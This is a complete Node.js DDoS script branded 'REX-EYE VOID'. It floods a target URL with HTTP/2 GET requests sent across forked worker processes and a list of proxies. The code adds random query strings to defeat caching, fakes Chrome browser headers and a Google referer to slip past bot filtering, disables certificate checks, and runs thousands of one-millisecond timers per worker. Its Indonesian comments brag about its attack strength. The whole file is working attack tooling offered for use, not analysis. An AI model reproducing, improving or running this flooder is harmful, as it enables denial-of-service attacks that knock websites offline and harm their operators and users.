const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`REX-EYE VOID | node raw.js <url> <time> <rate> <threads> [--noproxy]`); 
    process.exit();
}

const useProxy = process.argv[6] !== "--noproxy";
const ciphers = "TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256";

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    honorCipherOrder: true,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
});

var proxies = useProxy ? fs.readFileSync("proxy.txt", "utf-8").split(/\r?\n/).filter(l => l.trim()) : [];

const args = { target: process.argv[2], time: ~~process.argv[3], rate: ~~process.argv[4], threads: ~~process.argv[5] };
const parsed = url.parse(args.target);
let stats = { total: 0, success: 0, blocked: 0, active: 0 };

if (cluster.isMaster) {
    console.log(`🔥 REX-EYE GACOR MODE ACTIVE | Target: ${args.target}`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => { console.log(`\n✅ TOTAL REQUESTS: ${stats.total}`); process.exit(1); }, args.time * 1000);
} else {
    // Engine Overclock: 5 intervals per thread biar nggak ada jeda
    for (let j = 0; j < 5000; j++) {
        setInterval(() => { if (stats.active < 2000) runFlooder(); }, 1);
    }
}

function randomString(l) { return crypto.randomBytes(l).toString('hex').slice(0, l); }

function runFlooder() {
    stats.active++;
    const proxyAddr = useProxy ? proxies[Math.floor(Math.random() * proxies.length)] : null;
    
    const makeRequest = (conn) => {
        const tlsConn = tls.connect(443, parsed.host, {
            socket: conn, ALPNProtocols: ["h2"], servername: parsed.host,
            secureContext: secureContext, rejectUnauthorized: false
        }, () => {
            const client = http2.connect(parsed.href, {
                createConnection: () => tlsConn,
                settings: { enablePush: false, initialWindowSize: 1073741823, maxConcurrentStreams: 1000 }
            });

            // Gacor Pipelining: Hajar banyak request per satu koneksi TLS
            for (let i = 0; i < args.rate; i++) {
                const req = client.request({
                    [":method"]: "GET",
                    [":path"]: parsed.path + "?" + randomString(8) + "=" + randomString(5),
                    [":scheme"]: "https",
                    [":authority"]: parsed.host,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9", // Lock biar statistik luar negeri
                    "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                    "referer": "https://www.google.com/",
                    "cache-control": "no-cache"
                });

                req.setPriority({ weight: 256, exclusive: true }); // H2 Priority Gacor

                req.on("response", (res) => {
                    stats.total++;
                    if (res[":status"] === 200) stats.success++;
                    else stats.blocked++;
                    req.close();
                });

                req.on("error", () => { req.destroy(); });
                req.end();
            }

            setTimeout(() => { client.destroy(); tlsConn.destroy(); stats.active--; }, 8000);
        });

        tlsConn.on("error", () => { tlsConn.destroy(); stats.active--; });
    };

    if (useProxy && proxyAddr) {
        const [host, port] = proxyAddr.split(":");
        const ps = net.connect(~~port, host);
        ps.on("connect", () => { ps.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\n\r\n`); });
        ps.on("data", (d) => { if (d.toString().includes("200")) makeRequest(ps); else ps.destroy(); });
        ps.on("error", () => { ps.destroy(); stats.active--; });
    } else { makeRequest(null); }
}